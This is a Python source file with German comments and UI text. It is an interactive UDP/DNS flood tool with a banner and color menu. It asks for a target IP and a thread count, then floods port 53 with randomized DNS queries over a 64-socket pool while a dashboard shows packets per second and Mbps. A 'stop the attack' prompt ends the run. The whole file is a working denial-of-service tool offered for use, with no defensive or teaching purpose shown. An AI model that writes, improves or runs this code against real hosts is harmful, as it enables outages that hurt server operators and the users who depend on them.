import os
import random
import socket
import struct
import sys
import threading
import time
from typing import Dict

# --- Globale Konstanten & Variablen ---
MAX_PACKET_SIZE = 65535
DNS_QUERY_TYPES = [
    "ANY",
    "A",
    "AAAA",
    "MX",
    "TXT",
    "SRV",
    "NS",
    "SOA",
    "CNAME",
    "PTR",
    "DNSKEY",
    "RRSIG",
]

# Thread-Synchronisation für globale Zähler im Menü
global_packet_counter = 0
global_byte_counter = 0
counter_lock = threading.Lock()
stop_event = threading.Event()


# --- Advanced DNS Implementation ---
class AdvancedDNSUtils:

    @staticmethod
    def build_dns_query(domain: str, query_type: str = "ANY") -> bytes:
        transaction_id = random.randint(1, 65535)
        flags = 0x0100 | 0x0200  # Standard query + Recursion desired
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack(
            "!HHHHHH",
            transaction_id,
            flags,
            questions,
            answer_rrs,
            authority_rrs,
            additional_rrs,
        )

        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"

        qtype_map = {
            "A": 1,
            "AAAA": 28,
            "MX": 15,
            "TXT": 16,
            "ANY": 255,
            "SRV": 33,
            "NS": 2,
            "SOA": 6,
            "CNAME": 5,
            "PTR": 12,
            "DNSKEY": 48,
            "RRSIG": 46,
        }
        qtype = qtype_map.get(query_type.upper(), 1)
        qclass = 1  # IN (Internet)

        question = qname + struct.pack("!HH", qtype, qclass)
        return header + question

    @staticmethod
    def build_dns_response_query(
        domain: str, query_type: str = "ANY"
    ) -> bytes:
        transaction_id = random.randint(1, 65535)
        flags = 0x8000 | 0x0200  # Response + Recursion desired
        questions = 1
        answer_rrs = 1
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack(
            "!HHHHHH",
            transaction_id,
            flags,
            questions,
            answer_rrs,
            authority_rrs,
            additional_rrs,
        )

        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"

        qtype_map = {"A": 1, "AAAA": 28, "MX": 15, "TXT": 16, "ANY": 255}
        qtype = qtype_map.get(query_type.upper(), 1)
        qclass = 1  # IN (Internet)

        question = qname + struct.pack("!HH", qtype, qclass)

        answer_name = 0xC00C  # Pointer to question name
        answer_type = qtype
        answer_class = qclass
        answer_ttl = 300
        answer_rdlength = 4
        answer_rdata = socket.inet_aton("127.0.0.1")

        answer = (
            struct.pack(
                "!HHHIH",
                answer_name,
                answer_type,
                answer_class,
                answer_ttl,
                answer_rdlength,
            )
            + answer_rdata
        )

        return header + question + answer


# --- Advanced Protocol Handlers ---
class ProtocolHandler:

    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port


class MaximumUDPFloodHandler(ProtocolHandler):

    def __init__(
        self,
        target_ip: str,
        target_port: int,
        packet_size: int = 1024,
        use_ipv6: bool = False,
    ):
        super().__init__(target_ip, target_port)
        self.packet_size = min(packet_size, MAX_PACKET_SIZE)
        self.use_ipv6 = use_ipv6
        self.socket_pool = self._create_socket_pool()
        self.socket_index = 0

    def _create_socket_pool(self) -> list:
        """Erstellt einen Socket-Pool für maximale Performance"""
        sockets = []
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET

        for _ in range(64):  # Großer Socket-Pool zur Durchsatzmaximierung
            try:
                sock = socket.socket(family, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Setzt den Sende-Buffer im OS hoch, um Freezes zu minimieren
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                except:
                    pass

                sockets.append(sock)
            except Exception as e:
                print(f"\n[WARNUNG] Socket-Erstellung fehlgeschlagen: {e}")

        return sockets

    def _generate_dns_payload(self) -> bytes:
        domains = [
            "example.com",
            "google.com",
            "amazon.com",
            "microsoft.com",
            "cloudflare.com",
            "facebook.com",
            "twitter.com",
            "youtube.com",
            "netflix.com",
            "apple.com",
            "instagram.com",
            "whatsapp.com",
        ]
        return AdvancedDNSUtils.build_dns_query(
            random.choice(domains), random.choice(DNS_QUERY_TYPES)
        )

    def run_flood(self):
        """Wird von den Threads aufgerufen und nutzt den Socket-Pool"""
        global global_packet_counter, global_byte_counter
        server = (self.target_ip, self.target_port)
        pool_size = len(self.socket_pool)

        if pool_size == 0:
            print("\n[FEHLER] Kein funktionierender Socket im Pool.")
            return

        while not stop_event.is_set():
            try:
                # Nutzt rotierend die Sockets aus dem vorbereiteten Pool
                sock = self.socket_pool[self.socket_index % pool_size]
                self.socket_index += 1

                payload = self._generate_dns_payload()
                sent_bytes = sock.sendto(payload, server)

                with counter_lock:
                    global_packet_counter += 1
                    global_byte_counter += sent_bytes
            except socket.error:
                time.sleep(0.001)  # Minimaler Schutz bei Netzwerk-Sättigung

        # Sockets nach Stopp sauber schließen
        for sock in self.socket_pool:
            try:
                sock.close()
            except:
                pass


# --- UI & Menü-Struktur ---
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print(
        """
██████╗ ██████╗  
██╔══██╗██╔══██╗
██████╔╝██████╔╝
██╔═══╝ ██╔═══╝ 
██║     ██║     
╚═╝     ╚═╝      
    """
    )
    print("\033[0m")


def choose_color():
    print("1 - Rot\n2 - Grün\n3 - Blau\n4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")


def dashboard():
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed > 0:
            pps = global_packet_counter / elapsed
            mbps = (global_byte_counter * 8) / (elapsed * 1024 * 1024)
        else:
            pps, mbps = 0, 0

        print(
            f"\r[INFO] Pakete: {global_packet_counter} | Rate: {pps:.2f} pps | Durchsatz: {mbps:.2f} Mbps",
            end="",
        )
        time.sleep(1)


# --- Hauptprogramm ---
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - ADVANCED DNS FLOOD (Socket-Pool)")
        print("2 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "2":
            print("[INFO] Programm beendet.")
            sys.exit()

        if choice == "1":
            target_ip = input("Ziel-IP-Adresse: ")
            threads_count = int(input("Anzahl der Threads: "))

            # Reset Stats
            global_packet_counter = 0
            global_byte_counter = 0
            stop_event.clear()

            # Initialisiere den Handler (erstellt automatisch den 64er-Socket-Pool)
            handler = MaximumUDPFloodHandler(target_ip, target_port=53)

            print(f"\n[INFO] Starte {threads_count} Threads...")
            attack_threads = [
                threading.Thread(target=handler.run_flood)
                for _ in range(threads_count)
            ]

            for thread in attack_threads:
                thread.start()

            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

            # Threads sauber beenden
            for thread in attack_threads:
                thread.join()
            dashboard_thread.join()
            print("[INFO] Alle Threads erfolgreich beendet.\n")
